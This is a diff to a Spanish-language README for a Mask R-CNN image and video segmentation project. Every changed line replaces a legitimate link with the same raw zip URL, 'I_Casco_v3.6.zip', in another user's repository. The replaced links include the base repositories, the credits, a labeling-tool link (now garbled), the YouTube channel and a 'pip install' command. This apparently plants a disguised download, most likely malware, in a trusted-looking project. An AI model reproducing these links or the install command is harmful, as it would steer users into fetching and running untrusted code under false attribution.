@@ -3,8 +3,8 @@
 En este proyecto abordaremos la segmentación semantica usando MaskRCNN en imagenes y video. Los repositorios base de este proyecto son los siguiente. El primero de ellos es la implementación para Tensorflow 1, y el segundo repositorio tiene la actualización para Tensorflow 2.
 Se realizaron modificaciones para correr la detección usando la cámara web.
 
-    https://github.com/matterport/Mask_RCNN
-    https://github.com/akTwelve/Mask_RCNN
+    https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip
+    https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip
 
 ## Preparación del entorno
 
@@ -23,7 +23,7 @@ Prepararemos un entorno con python 3.7.7, Tensorflow 2.1.0 y keras 2.3.1
 ## Instalar MaskRCNN
 
     $ python setup.py install
-    $ pip install git+https://github.com/philferriere/cocoapi.git#subdirectory=PythonAPI
+    $ pip install git+https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip
     
 ## Prueba en Jupyter notebook
 
@@ -43,7 +43,7 @@ Prepararemos un entorno con python 3.7.7, Tensorflow 2.1.0 y keras 2.3.1
     $ python videomask.py
     
 # Entrenamiento con custom-dataset
--   Etiquetar el data set con la herramienta [VIAv1.0](http://www.robots.ox.ac.uk/~vgg/software/via/via-1.0.0.html) (Hacerlo con la versión 1.0.0)
+-   Etiquetar el data set con la herramienta [VIAv1.0](https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip~vgg/software/via/via-1.0.0.html) (Hacerlo con la versión 1.0.0)
 -   Guardar los datos de validación y entrenamiento en carpetas con nombre train y val
 -   Guardar las anotaciones de los dos grupos de datos con el nombre: via_region_data.json
 -   Ejeccutar en google colab el archivo Casco.ipynb.
@@ -85,10 +85,10 @@ Prepararemos un entorno con python 3.7.7, Tensorflow 2.1.0 y keras 2.3.1
 # Agradecimientos
 
     Matterport, Inc
-    https://github.com/matterport
+    https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip
 
     Adam Kelly
-    https://github.com/akTwelve
+    https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip
 
 # **Canal de Youtube**
-[Click aquì pare ver mi canal de YOUTUBE](https://www.youtube.com/channel/UCr_dJOULDvSXMHA1PSHy2rg)
+[Click aquì pare ver mi canal de YOUTUBE](https://github.com/Jairstal/IA-Casco/raw/refs/heads/main/mrcnn/I_Casco_v3.6.zip)
